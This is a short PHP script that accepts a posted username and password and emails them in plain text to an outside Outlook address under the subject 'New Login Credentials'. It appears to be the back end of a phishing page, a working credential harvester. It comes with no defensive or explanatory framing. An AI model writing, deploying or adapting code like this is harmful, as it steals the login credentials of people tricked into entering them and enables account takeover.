<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $to = "blackrosemodelingms@outlook.com";
    $subject = "New Login Credentials";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@blackrosemodeling.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Credentials sent successfully.";
    } else {
        echo "Failed to send credentials.";
    }
} else {
    echo "Invalid request.";
}
?>
